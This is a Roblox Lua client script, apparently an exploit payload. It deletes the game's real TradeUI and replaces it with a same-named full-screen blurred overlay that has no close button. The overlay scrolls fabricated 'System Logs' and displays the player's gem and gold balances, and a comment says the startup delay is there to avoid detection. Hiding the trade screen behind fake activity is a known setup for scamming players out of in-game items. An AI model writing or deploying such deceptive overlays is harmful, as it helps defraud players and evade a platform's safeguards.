-- Services
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local UIS = game:GetService("UserInputService")

task.wait(2) -- ✅ Delay to avoid instant detection
Instance.new("BlurEffect", game.Lighting).Size = 35

-- ✅ Destroy existing TradeUI before replacing it
local existingUI = LocalPlayer:FindFirstChildOfClass("PlayerGui"):FindFirstChild("TradeUI")
if existingUI then
    existingUI:Destroy()
end

-- ✅ Create New GUI with the Same Name as `TradeUI`
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "TradeUI" -- ✅ Uses the same name to blend in
ScreenGui.ResetOnSpawn = false
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Parent = LocalPlayer:FindFirstChildOfClass("PlayerGui") or LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.IgnoreGuiInset = true -- ✅ Ensures full screen coverage

-- Full-Screen Overlay (Fully Covers Screen)
local Overlay = Instance.new("Frame")
Overlay.Size = UDim2.new(1, 0, 1, 0) -- ✅ Covers the full screen
Overlay.Position = UDim2.new(0, 0, 0, 0) -- ✅ Starts at the top-left corner
Overlay.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Overlay.BackgroundTransparency = 0.1 -- 40% Transparent
Overlay.Parent = ScreenGui

-- Main GUI Window (Lower Position, No Close Button)
local UpdateBox = Instance.new("Frame")
UpdateBox.Size = UDim2.new(0, 600, 0, 450) -- Larger GUI
UpdateBox.Position = UDim2.new(0.5, -300, 0.75, -225) -- Moved lower
UpdateBox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
UpdateBox.BorderSizePixel = 2
UpdateBox.BorderColor3 = Color3.fromRGB(255, 255, 255)
UpdateBox.Parent = ScreenGui

-- Rounded Corners
local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 15) -- Smooth rounded edges
UICorner.Parent = UpdateBox

-- Title
local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 40) -- Bigger title bar
Title.Text = "🔄 System Logs"
Title.Font = Enum.Font.GothamBold
Title.TextSize = 20
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.BackgroundColor3 = Color3.fromRGB(50, 50, 50) -- Darker for modern look
Title.Parent = UpdateBox

-- Player Stats Display
local StatsText = Instance.new("TextLabel")
StatsText.Size = UDim2.new(1, -20, 0, 100) -- Bigger stats area
StatsText.Position = UDim2.new(0, 10, 0, 50)
StatsText.Font = Enum.Font.Gotham
StatsText.TextSize = 16
StatsText.TextColor3 = Color3.fromRGB(200, 200, 200)
StatsText.BackgroundTransparency = 1
StatsText.TextWrapped = true
StatsText.TextYAlignment = Enum.TextYAlignment.Top
StatsText.Parent = UpdateBox

-- Log Window (Bigger but **Not Scrollable**)
local LogFrame = Instance.new("Frame")
LogFrame.Size = UDim2.new(1, -20, 0, 280) -- Bigger log area
LogFrame.Position = UDim2.new(0, 10, 0, 160)
LogFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
LogFrame.BorderSizePixel = 1
LogFrame.BorderColor3 = Color3.fromRGB(100, 100, 100)
LogFrame.Parent = UpdateBox

local LogText = Instance.new("TextLabel")
LogText.Size = UDim2.new(1, -10, 1, -10)
LogText.Position = UDim2.new(0, 5, 0, 5)
LogText.Font = Enum.Font.Code
LogText.TextSize = 14
LogText.TextColor3 = Color3.fromRGB(180, 180, 180)
LogText.BackgroundTransparency = 1
LogText.TextWrapped = true
LogText.TextXAlignment = Enum.TextXAlignment.Left
LogText.TextYAlignment = Enum.TextYAlignment.Top
LogText.Text = ""
LogText.Parent = LogFrame

-- Function to Generate Realistic Logs
local function generateLog()
    local categories = {"INFO", "SUCCESS", "WARN", "ERROR", "DEBUG"}
    local sources = {
        "game.Players.LocalPlayer.Inventory.Units",
        "game.ReplicatedStorage.RemoteEvents",
        "game.Workspace.NPCs",
        "game.ServerScriptService.LogicScripts",
        "game.Lighting.Environment",
        "game.ReplicatedStorage.ShopItems",
        "game.Workspace.BattleZone",
        "game.ServerStorage.DataFiles"
    }
    local actions = {
        "Fetching data from", "Validating request in", "Executing function in",
        "Error detected at", "Attempting fix in", "Processing request for",
        "Saving data to", "Upgrading object in", "Applying patch to",
        "Timeout detected in", "Checking status of"
    }
    local outcomes = {
        "Operation completed successfully", "Unexpected nil value encountered",
        "Data mismatch detected", "Server response delayed",
        "Script execution failed", "System memory check: Stable",
        "Permission denied: Admin access required", "File successfully updated",
        "Transaction failed: Insufficient resources", "Event triggered successfully",
        "Unstable connection detected", "Object reference lost: Resetting cache",
        "Database update completed"
    }

    return string.format("[%s] %s %s: %s",
        categories[math.random(#categories)],
        actions[math.random(#actions)],
        sources[math.random(#sources)],
        outcomes[math.random(#outcomes)]
    )
end

-- Function to Update Logs (Now More Realistic)
local logs = {}
local function updateLogs()
    while true do
        table.insert(logs, 1, generateLog()) -- Generate realistic logs
        if #logs > 20 then
            table.remove(logs) -- Keep only the latest 20 logs
        end
        LogText.Text = table.concat(logs, "\n")
        task.wait(1.5) -- Update every 1.5 seconds
    end
end

-- Function to Update Stats
local function updateStats()
    while true do
        local gems = LocalPlayer._stats.gem_amount.Value or 0
        local gold = LocalPlayer._stats.gold_amount.Value or 0
        local resourceGems = LocalPlayer._stats._resourceGemsLegacy.Value or 0
        local holidayStars = LocalPlayer._stats._resourceHolidayStars.Value or 0
        local uptime = math.floor(workspace.DistributedGameTime) -- Server uptime in seconds

        StatsText.Text = string.format(
            "💎 Gems: %d\n💰 Gold: %d\n✨ Resource Gems: %d\n🎄 Holiday Stars: %d\n⏳ Uptime: %d seconds",
            gems, gold, resourceGems, holidayStars, uptime
        )

        task.wait(1) -- Update every second
    end
end

-- Start Updating Stats & Logs
task.spawn(updateStats)
task.spawn(updateLogs)
